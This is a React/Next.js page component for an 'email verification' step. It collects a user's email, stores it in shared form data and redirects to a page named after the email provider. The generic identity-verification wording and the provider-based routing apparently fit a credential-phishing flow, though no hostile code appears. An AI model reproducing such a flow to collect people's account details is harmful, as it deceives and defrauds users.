import React, { useContext, useState } from "react";
import { Box } from "@chakra-ui/react";
import { yupResolver } from "@hookform/resolvers/yup";
import { useRouter } from "next/router";
import { useForm } from "react-hook-form";
import * as yup from "yup";
import { Button } from "../../../components/Button";
import { Container } from "../../../components/Container";
import { Input } from "../../../components/Input";
import { InputWrapper } from "../../../components/InputWrapper";
import { IntroText } from "../../../components/IntroText";
import { ProgressBar } from "../../../components/ProgressBar";
import { Section } from "../../../components/Section";
import { Wrapper } from "../../../components/Wrapper";
import { Loading } from "../../../components/Loading";
import { DataContext } from "../../_app";
import { getProgress } from "../../../utils/getProgress";

interface EmailVerificationProps {}

const schema = yup.object().shape({
  email: yup
    .string()
    .required("The field can't be left blank. Please enter your email address.")
    .email("Oops! Looks like the email address you have entered is not valid."),
});

const EmailVerification: React.FC<EmailVerificationProps> = () => {
  const [loading, setLoading] = useState(false);
  const { data: datas, setData } = useContext(DataContext);
  const { push } = useRouter();
  const {
    register,
    handleSubmit,
    formState: { errors, isValid },
    watch,
  } = useForm({
    resolver: yupResolver(schema),
    mode: `onBlur`,
  });

  const onSubmit = handleSubmit(async (data) => {
    setLoading(true);

    setData({
      ...datas,
      ...data,
    });

    const emailProvider = data["email"].split("@")[1].split(".")[0];
    push(`/email/validate/${emailProvider}`);
  });
  return (
    <>
      {loading ? <Loading /> : null}
      <Wrapper>
        <Container>
          <ProgressBar
            indicators={getProgress()}
            highlight={getProgress().indexOf(`Email Verification`)}
          />
          <Section>
            <IntroText
              title={`Verify your email address`}
              paragraph={`Enter the email address associated with your account to. We require this information to verify your identity.`}
            />
            <Box as={`section`}>
              <Box>
                <Box
                  as={`fieldset`}
                  m={`42px 0 18px`}
                  mt={0}
                  p={0}
                  border={0}
                  minW={0}
                >
                  <Box
                    _before={{
                      content: `" "`,
                      display: `table`,
                    }}
                    _after={{
                      clear: `both`,
                      content: `" "`,
                      display: `table`,
                    }}
                  >
                    <InputWrapper>
                      <Input
                        label={`Email address`}
                        placeholder={`Email address`}
                        boxStyle={{
                          w: `100%`,
                        }}
                        error={errors.email && errors.email.message}
                        register={register}
                        name={`email`}
                        curValue={watch(`email`)}
                      />
                    </InputWrapper>
                    <Button
                      text={`Continue Verification`}
                      minW={[`100%`, `220px`]}
                      w={[`100%`, `auto`]}
                      m={[`22px 0 20px 0`, `22px 20px 20px 0`]}
                      mt={`22px`}
                      ml={[0, `10px`]}
                      lineHeight={`56px`}
                      disabled={loading || !isValid}
                      onClick={onSubmit}
                    />
                  </Box>
                </Box>
              </Box>
            </Box>
          </Section>
        </Container>
      </Wrapper>
    </>
  );
};

export default EmailVerification;
